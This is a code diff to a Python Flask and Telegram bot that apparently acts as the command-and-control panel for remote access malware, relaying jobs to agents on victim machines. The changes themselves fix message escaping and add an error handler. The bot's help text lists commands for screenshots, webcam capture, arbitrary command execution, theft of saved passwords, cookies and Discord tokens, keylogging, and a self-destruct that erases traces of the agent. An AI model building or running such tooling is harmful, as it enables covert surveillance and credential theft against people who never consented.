@@ -1,12 +1,13 @@
 # api/index.py
-# FINAL VERSION - Fully asynchronous with httpx
+# FINAL VERSION - Corrected Markdown & Added Error Handler
 
 import os
 import re
 import json
 import uuid
-import httpx  # Replaced 'requests' with 'httpx'
+import httpx
 import asyncio
+import traceback
 from flask import Flask, request
 
 from telegram import Update
@@ -23,9 +24,12 @@ STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
 
-# --- Helper Functions (Rewritten to be async) ---
+# --- Helper Functions ---
 def esc(text):
-    return escape_markdown(str(text), version=2)
+    """Safely escapes text for Telegram MarkdownV2."""
+    # This is a more robust escape function for MarkdownV2
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))
 
 async def get_state():
     """Reads the current selected_target asynchronously."""
@@ -64,17 +68,19 @@ async def post_job(target_id, command, args):
             print(f"Error posting job: {e}")
             return False
 
-# --- Telegram Command Handlers (Updated with 'await') ---
+# --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Displays the help menu with corrected Markdown."""
+    # --- MODIFIED: Corrected the MarkdownV2 formatting ---
     help_text = (
-        "__**Vercel Controller Help**__\n\n"
+        "*Vercel Controller Help*\n\n"
         "This bot uses webhooks to post jobs for remote agents\\.\n\n"
-        "__🎯 **Core Controls**__\n"
-        "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\\.\n"
-        "`/help` \\- Shows this help message\\.\n\n"
-        "__💣 **Destructive Commands**__\n"
-        "`/destroy <id> CONFIRM` \\- Removes all traces of the agent from a target\\.\n\n"
-        "__🕵️ **Agent Commands (Dispatched)**__\n"
+        "*🎯 Core Controls*\n"
+        "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\n"
+        "`/help` \\- Shows this help message\n\n"
+        "*💣 Destructive Commands*\n"
+        "`/destroy <id> CONFIRM` \\- Removes all traces of the agent\n\n"
+        "*🕵️ Agent Commands \\(Dispatched\\)*\n"
         "`/info`, `/ss`, `/cam`, `/exec <cmd>`\n"
         "`/grab <passwords|cookies|discord|all>`\n"
         "`/startkeylogger`, `/stopkeylogger`\n"
@@ -91,7 +97,7 @@ async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if target_id == 'clear':
         await set_state(None)
-        await update.message.reply_text("✅ Target cleared.")
+        await update.message.reply_text("✅ Target cleared\\.")
     else:
         await set_state(target_id)
         await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`")
@@ -103,13 +109,13 @@ async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_id = context.args[0]
     confirmation = context.args[1] if len(context.args) > 1 else ""
     if confirmation.upper() != "CONFIRM":
-        reply_text = (f"⚠️ **ARE YOU SURE?** ⚠️\n\nThis will permanently remove the agent from `{esc(target_id)}`\\. This action cannot be undone\\.\n\nTo proceed, type:\n`/destroy {esc(target_id)} CONFIRM`")
+        reply_text = (f"⚠️ *ARE YOU SURE?* ⚠️\n\nThis will permanently remove the agent from `{esc(target_id)}`\\. This action cannot be undone\\.\n\nTo proceed, type:\n`/destroy {esc(target_id)} CONFIRM`")
         await update.message.reply_text(reply_text, parse_mode='MarkdownV2')
         return
     if await post_job(target_id, "destroy", ""):
         await update.message.reply_text(f"✅ Self\\-destruct job dispatched to target `{esc(target_id)}`\\.", parse_mode='MarkdownV2')
     else:
-        await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job.")
+        await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job\\.")
 
 async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     selected_target = await get_state()
@@ -121,9 +127,18 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
     if await post_job(selected_target, command, args):
         await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to target `{esc(selected_target)}`\\.", parse_mode='MarkdownV2')
     else:
-        await update.message.reply_text("❌ Error: Failed to dispatch job.")
+        await update.message.reply_text("❌ Error: Failed to dispatch job\\.")
+
+# --- NEW: Error Handler for easier debugging ---
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Logs the error and sends a telegram message to notify the developer."""
+    print(f"An exception was raised while handling an update: {context.error}")
+    tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
+    tb_string = "".join(tb_list)
+    print(tb_string)
 
 # --- Register handlers ---
+ptb_app.add_error_handler(error_handler) # Register the error handler
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
